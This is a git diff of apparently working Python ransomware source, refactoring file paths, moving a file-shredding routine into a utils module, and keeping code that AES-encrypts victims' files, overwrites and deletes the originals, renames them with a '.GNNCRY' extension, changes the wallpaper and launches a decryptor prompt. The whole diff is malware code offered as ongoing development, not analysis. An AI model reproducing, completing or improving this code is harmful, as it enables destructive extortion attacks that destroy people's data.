@@ -5,6 +5,7 @@ import symmetric
 import enviroment
 import variables
 import persistence
+import utils
 
 import os
 import string
@@ -23,13 +24,13 @@ from Crypto.Cipher import PKCS1_OAEP
 
 
 
-with open(os.path.join(variables.ransomware_path, 'client_public_key.PEM'), 'r') as f:
+with open(variables.client_public_key_path, 'r') as f:
     client_public_key = f.read()
 client_public_key_obj = RSA.importKey(client_public_key)
 
 
 def get_paths():
-    with open(os.path.join(variables.ransomware_path, 'AES_encrypted_keys.txt')) as f:
+    with open(variables.aes_encrypted_keys_path) as f:
         content = f.read().split("\n")
     
     for aes_and_path in content:
@@ -43,10 +44,8 @@ def open_decryptor():
     if(output):
         return
     os.chdir(variables.ransomware_path)
-    gnome = 'gnome-terminal --command ./decryptor'
-    os.system(gnome)
-    xfce = 'xfce4-terminal --command=./decryptor'
-    os.system(xfce)
+    os.system('gnome-terminal --command ./decryptor')
+    os.system('xfce4-terminal --command=./decryptor')
 
 
 def change_wallpaper():
@@ -77,25 +76,6 @@ for (i=0;i<Desktops.length;i++) {
     os.system(kde)
 
 
-def shred(file_name,  passes=1):
-
-    def generate_data(length):
-        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
-        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))
-
-    if not os.path.isfile(file_name):
-        return False
-
-    ld = os.path.getsize(file_name)
-    with open(file_name,  "w") as fh:
-        for _ in range(int(passes)):
-            data = generate_data(ld)
-            fh.write(data)
-            fh.seek(0,  0)
-            
-    os.remove(file_name)
-
-
 def start_encryption(files):
     if(not files):
         return None
@@ -109,7 +89,7 @@ def start_encryption(files):
             file_content = f.read()
         
         encrypted = AES_obj.encrypt(file_content)
-        shred(found_file)
+        utils.shred(found_file)
 
         new_file_name = found_file + ".GNNCRY"
         with open(new_file_name, 'wb') as f:
